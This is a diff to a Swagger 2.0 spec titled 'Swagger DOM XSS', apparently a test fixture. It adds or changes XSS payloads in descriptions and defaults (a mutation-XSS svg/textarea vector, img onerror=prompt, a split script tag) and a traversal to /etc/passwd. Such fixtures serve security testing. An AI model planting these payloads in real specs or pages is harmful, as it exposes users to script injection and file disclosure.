@@ -2,7 +2,7 @@ swagger: '2.0'
 info: 
   title: Swagger DOM XSS
   description: <mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('textarea') src=1>"></form><h1>Desc: XSS
-  termsOfService: "../../..//../../../etc/passwd"
+  termsOfService: "../../../../../../../etc/passwd"
   version: production
 basePath: /JSSResource/
 produces:
@@ -46,7 +46,7 @@ paths:
       parameters:
         - description: XSS
           type: string
-          default: \">onerror=prompt()
+          default: \"><img src=x onerror=prompt()>
       responses:
         '200':
           description: No response was specified
@@ -59,11 +59,11 @@ paths:
         - description: Id value to filter by
           in: path
           name: id
-          required: true
+          required: true<img>
           type: string
       responses:
         '200':
-          description: No response was <h1>specified
+          description: No <h1>response was <scr<script>ipt>specified
       tags:
         - accounts
       description: 'You cannot create an LDAP group with a POST.  '
